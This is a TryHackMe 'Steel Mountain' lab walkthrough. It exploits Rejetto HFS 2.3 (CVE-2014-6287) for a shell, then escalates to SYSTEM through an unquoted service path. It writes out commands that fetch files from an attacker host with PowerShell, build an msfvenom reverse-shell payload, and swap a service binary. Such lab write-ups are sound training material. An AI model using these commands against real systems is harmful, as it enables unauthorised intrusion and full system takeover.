# Steel Mountain \(W\) \(wlk\)

_TryHackMe_ – [**Steel Mountain**](https://tryhackme.com/room/steelmountain) Write-Up

_topics_: web application security, powershell, Windows privilege escalation, public exploits, file transfering

1. **Plan**
2. **Enumeration**
3. **Local Privilege Escalation**
4. **Exploitation \(Root PrivEsc\)**

new tools: winPEAS, powershell

tools: firefox browser, terminal, nmapAutomator, python, msfvenom

## 1\) Plan

Not really a plan as this is a walkthrough. Hopefully this will make more sense than the Alfred box as an introduction to powershell and Windows privesc, surely one of my **weak points**.

## 2\) Enumeration

running `./nmapAutomator.sh <ip> Basic`_:_

The host is likely running Linux with windows services attributed to several open ports.

PORT STATE SERVICE VERSION

80/tcp open http Microsoft IIS httpd 8.5

\|\_http-server-header: Microsoft-IIS/8.5

135/tcp open msrpc Microsoft Windows RPC

139/tcp open netbios-ssn Microsoft Windows netbios-ssn

445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds

3389/tcp open ssl/ms-wbt-server?

Nmap returns some interesting things about the machine and our ticket in. OS is Windows Server 2008 R2 -2012 \(`nmap -sV -O <ip>`\). There is an additional webserver running on port 8080. Navigating to this page displays “no files in this server” header; with a login page, a home folder, a search bar, a select tab for all, invert and mask, and an actions tab to archive and get list.

Clicking the Server Information link reveals this web server is running the **Rejetto HTTP File Server 2.3** and because its installed version is 2.3, it is vulnerable to **CVE-2014-6287** \(R.C.E\).

searching on exploit-db yields a PoC exploit python script that requires a netcat binary and an HTTP server to deliver the payload.

## 3\) Local Privilege Escalation

Using exploit 39161, we will need to run a webserver on port 80, a netcat binary on the server and a netcat listener on a random port. The Rejetto PoC script explains the vulnerability that exists in version 2.3 in order to achieve a low privilege shell. The HFS HTTP file server can be used to send and receive files. Because port 8080 is open, the script has free reign to upload files to the HTTP file sharing server. The scipt uploads a netcat binary to use a bind shell on the target machine and because the port is open, it will accept the incoming connection and upload the .exe, rerouting it to the attackers IP that will be listening with netcat.

We will need to start the server and listener before running the command `python rejetto.py <targetIP>` _8080_ twice. The first time the command is run, we upload the netcat binary that the rejetto script calls and following the second run, a shell is established with netcat.

## 4\) Exploitation \(Root PrivEsc\)

With successful implementation of the exploit-db script, we have a low privilege shell as the user bill. We need to now transfer files from attacker to victim in order for winPEAS to check for ways we can become root. We can use powershell to transfer winPEAS from our server to the victim, but winPEAS is contingent on the CPU architecture of the victim. To check this use `systeminfo` which returns x64 based architecture.

We can use powershell to fetch winPEAS from our server \(verify in the correct directory, \Programs\Startup in this case\) `powershell -c "Invoke-WebRequest -OutFile winPEAS.exe http://<attacker ip>/winPEAS.exe"` followed by `dir` to verify and running it as _winPEAS.exe_.

 WinPEAS returns several potential attack vectors for root privilege, but one in particular stands out. An **unquoted path** running services. When a service is created whose executable path contains spaces and isn’t enclosed within quotes, leads to a vulnerability known as **Unquoted Service Path** which allows a user to gain SYSTEM privileges \(if service is running with those privileges\)

Using powershell to check which services are associated with the unquoted path _“C:\Program Files \(x86\)\IObit\Advanced SystemCare\ASCService.exe”_ `powershell -c "Get-Service"` and cd to the path. The payload will be created with msfvenom on the attacker machine `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker ip> LPORT=1234 -f exe -o ASCService.exe` and listen with netcat on port 1234 `nc -nlvp 1234`.

Following this, the service must be stopped `sc stop AdvancedSystemCareService9` and renamed/backed up `rename ASCService.exe ASCService_bak.exe`. Then the payload must be downloaded `powershell -c "Invoke-WebRequest -OutFile ASCService.exe http://<attacker_ip>/ASCService.exe"`

 and the service started `sc start AdvancedSystemCareService9`, which returns a shell with nt authority\system privileges.

